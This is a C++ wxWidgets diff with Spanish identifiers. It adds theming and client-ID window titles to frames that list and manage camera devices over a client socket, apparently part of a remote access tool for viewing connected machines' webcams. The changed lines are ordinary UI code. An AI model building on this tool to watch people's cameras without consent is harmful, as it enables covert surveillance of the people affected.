@@ -45,6 +45,8 @@ panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamI
 	this->Layout();
 
 	this->SetMenuBar(menuBar);
+
+	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
 
 void panelPictureBox::OnDrawBuffer(const char*& cBuffer, int iBufferSize) {
@@ -117,10 +119,11 @@ void panelPictureBox::OnGuardarFrame(wxCommandEvent& event) {
 	}
 }
 
-panelCamara::panelCamara(wxWindow* pParent, SOCKET sck):
+panelCamara::panelCamara(wxWindow* pParent, SOCKET sck, std::string _strID):
 	wxFrame(pParent, EnumCamMenu::ID_Main_Panel, "Camara") {
 
 	this->sckCliente = sck;
+	this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Camara");
 
 	this->cam_Devices = new wxComboBox(this, EnumCamMenu::ID_Combo_Devices, "...", wxDefaultPosition, wxSize(200, 20));
 	wxButton* btn_Listar = new wxButton(this, EnumCamMenu::ID_Refrescar_Lista, "Refrescar lista");
@@ -133,6 +136,8 @@ panelCamara::panelCamara(wxWindow* pParent, SOCKET sck):
 	nSizer->Add(btn_ManageCam, 0, wxALL, 1);
 	
 	this->SetSizerAndFit(nSizer);
+
+	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
 
 void panelCamara::ProcesarLista(const char*& pBuffer) {
@@ -160,7 +165,7 @@ void panelCamara::OnRefrescarLista(wxCommandEvent& event) {
 void panelCamara::OnManageCam(wxCommandEvent& event) {
 	//Abrir nueva frame para administrar la camara seleccionada en el combo box
 	if (this->cam_Devices->GetStringSelection() != "") {
-		this->pictureBox = new panelPictureBox(this, this->cam_Devices->GetStringSelection(), this->cam_Devices->GetSelection(), this->sckCliente);
+		this->pictureBox = new panelPictureBox(this, this->GetTitle() + " " + this->cam_Devices->GetStringSelection(), this->cam_Devices->GetSelection(), this->sckCliente);
 		this->pictureBox->Show(true);
 	}
 
